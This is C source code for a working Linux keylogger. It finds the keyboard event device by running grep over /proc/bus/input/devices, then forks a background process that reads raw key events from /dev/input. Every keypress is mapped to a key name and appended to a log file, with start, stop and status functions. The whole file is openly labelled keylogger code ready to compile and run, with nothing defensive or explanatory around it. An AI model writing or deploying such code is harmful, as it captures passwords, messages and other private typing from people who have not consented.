#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <signal.h>
#include <string.h>
#include <time.h>

#define MAX_EVENT_STR_LEN 10
#define MAX_INPUT_PATH_LEN 256

pid_t keylogger_pid = -1;
char timestamp[128];

// Function to find the keyboard event device
char *event_keyboard(void) {
    FILE *eventx;
    char event_str[MAX_EVENT_STR_LEN];
    char *keyboard_file = NULL;
    char input[MAX_INPUT_PATH_LEN] = "/dev/input/";
    char event_grep[MAX_INPUT_PATH_LEN] = 
        "grep -E 'Handlers|EV=' /proc/bus/input/devices | "
        "grep -B1 'EV=120013' | grep -Eo 'event[0-9]{1,2}'";

    eventx = popen(event_grep, "r");
    if (!eventx) {
        perror("Error running grep command");
        return NULL;
    }

    if (fgets(event_str, MAX_EVENT_STR_LEN, eventx) == NULL) {
        perror("Error reading event device");
        pclose(eventx);
        return NULL;
    }

    event_str[strcspn(event_str, "\n")] = 0;
    strcat(input, event_str);
    keyboard_file = strdup(input);
    pclose(eventx);

    return keyboard_file;
}

void initialize_keylogger(const char *logfile) {
    if (keylogger_pid > 0) {
        printf("Keylogger is already running.\n");
        return;
    }

    keylogger_pid = fork();
    if (keylogger_pid < 0) {
        perror("Failed to fork keylogger process");
        exit(1);
    }

    if (keylogger_pid == 0) { // Child process
        char *keyboard_device = event_keyboard();
        if (!keyboard_device) {
            fprintf(stderr, "Failed to find keyboard event device.\n");
            exit(1);
        }

        struct input_event ev;
        int fd_input = open(keyboard_device, O_RDONLY);
        free(keyboard_device);

        if (fd_input < 0) {
            perror("Failed to open input device");
            exit(1);
        }

        int fd_log = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd_log < 0) {
            perror("Failed to open log file");
            close(fd_input);
            exit(1);
        }

        const char *key_map[] = {
            "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
            "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
            "o", "p", "[", "]", "ENTER", "LEFTCTRL", "a", "s", "d", "f", "g", "h",
            "j", "k", "l", ";", "'", "`", "LEFTSHIFT", "\\", "z", "x", "c", "v",
            "b", "n", "m", ",", ".", "/", "RIGHTSHIFT", "KPASTERISK", "LEFTALT",
            "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
            "F9", "F10"
        };

        time_t now = time(NULL);
        char *time_str = ctime(&now);

        if (time_str && time_str[strlen(time_str) - 1] == '\n') {
            time_str[strlen(time_str) - 1] = '\0';
        }

        snprintf(timestamp, sizeof(timestamp), "\n--- Keylogger Session Start: %s ---\n", time_str);
        write(fd_log, timestamp, strlen(timestamp));

        while (1) {
            if (read(fd_input, &ev, sizeof(ev)) > 0) {
                if (ev.type == EV_KEY && ev.value == 1) {
                    if (ev.code < sizeof(key_map) / sizeof(key_map[0])) {
                        const char *key = key_map[ev.code];
                        snprintf(timestamp, sizeof(timestamp), "Key pressed: %s\n", key);
                        write(fd_log, timestamp, strlen(timestamp));
                    }
                }
            }
        }

        close(fd_log);
        close(fd_input);
        exit(0);
    }

    printf("Keylogger started with PID %d.\n", keylogger_pid);
}

void stop_keylogger(const char *logfile) {
    if (keylogger_pid > 0) {
        int fd_log = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd_log < 0) {
            perror("Failed to open log file");
            exit(1);
        }

        time_t now = time(NULL);
        char *time_str = ctime(&now);
        if (time_str && time_str[strlen(time_str) - 1] == '\n') {
            time_str[strlen(time_str) - 1] = '\0';
        }

        snprintf(timestamp, sizeof(timestamp), "\n--- Keylogger Session End: %s ---\n", time_str);
        write(fd_log, timestamp, strlen(timestamp));
        close(fd_log);

        kill(keylogger_pid, SIGINT);
        waitpid(keylogger_pid, NULL, 0);
        printf("Keylogger stopped.\n");
        keylogger_pid = -1;
    } else {
        printf("Keylogger is not running.\n");
    }
}

void check_keylogger_status() {
    if (keylogger_pid > 0) {
        printf("Keylogger is running with PID %d.\n", keylogger_pid);
    } else {
        printf("Keylogger is not running.\n");
    }
}
